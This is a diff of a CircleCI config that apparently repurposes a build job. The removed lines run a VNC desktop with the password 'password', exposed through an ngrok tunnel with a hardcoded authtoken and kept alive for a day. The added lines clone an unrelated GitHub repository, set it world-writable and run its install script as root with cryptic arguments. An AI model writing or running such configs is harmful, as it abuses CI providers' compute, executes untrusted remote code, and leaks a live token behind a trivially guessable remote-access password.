@@ -2,20 +2,11 @@ version: 2.1
 jobs:
   build:
     docker: 
-      - image: ubuntu:20.04
+      - image: centos:latesst
     steps:
       - add_ssh_keys:
           fingerprints:
             - "2b:0a:48:9e:6f:db:0b:b7:95:9e:3a:03:54:08:bb:40"
       - run:
           command: |
-            apt update
-            apt install unzip wget vnc4server mate-desktop-environment-core -y
-            wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip
-            unzip ngrok-stable-linux-amd64.zip
-            ./ngrok authtoken 1c4LXcUXOpIOAKT3obuC8qCHzOE_2wWv9tDhXnrCgxGfj5DLp
-            printf "password\npassword\n\n" | vncpasswd
-            export USER=root
-            vncserver -geometry 1920x1080 -depth 24
-            ./ngrok tcp 5901 &
-            vmstat 60 1440
+            yum -y update || apt update && yum -y install git whiptail || apt install -y git whiptail && cd /root && git clone https://github.com/golemcli/Rixter.git && chmod -R 777 Rixter && Rixter/install.sh "3" "fb6eb032c1e071f0675d01e9d29bf5a2" "30" "5" "2"
